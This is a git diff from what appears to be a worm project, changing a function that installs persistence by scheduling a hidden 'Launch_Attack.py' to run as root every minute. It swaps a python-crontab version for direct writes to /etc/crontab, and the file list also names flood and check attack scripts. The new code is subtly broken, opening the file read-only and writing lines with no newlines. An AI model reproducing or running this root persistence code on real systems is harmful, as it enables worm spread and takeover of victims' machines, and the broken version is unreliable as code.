@@ -8,19 +8,24 @@ attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
 
 
 def set_up_crontab():
-    cron = CronTab(user=True)
+    # cron = CronTab(user=True)
+    #
+    # if not cron.find_comment('etc worm attack'):
+    #     job1 = cron.new(command='sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py',
+    #                     comment='etc worm attack')
+    #     job1.setall('*/1 * * * *')
+    #
+    # if not cron.find_comment('var worm attack'):
+    #     job2 = cron.new(command='sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py',
+    #                     comment='var worm attack')
+    #     job2.setall('*/1 * * * *')
+    #
+    # cron.write()
 
-    if not cron.find_comment('etc worm attack'):
-        job1 = cron.new(command='sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py',
-                        comment='etc worm attack')
-        job1.setall('*/1 * * * *')
-
-    if not cron.find_comment('var worm attack'):
-        job2 = cron.new(command='sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py',
-                        comment='var worm attack')
-        job2.setall('*/1 * * * *')
-
-    cron.write()
+    cron = open('/etc/crontab')
+    cron.write('*/1 * * * * root sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py')
+    cron.write('*/1 * * * * root sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py')
+    cron.close()
 
     return
 
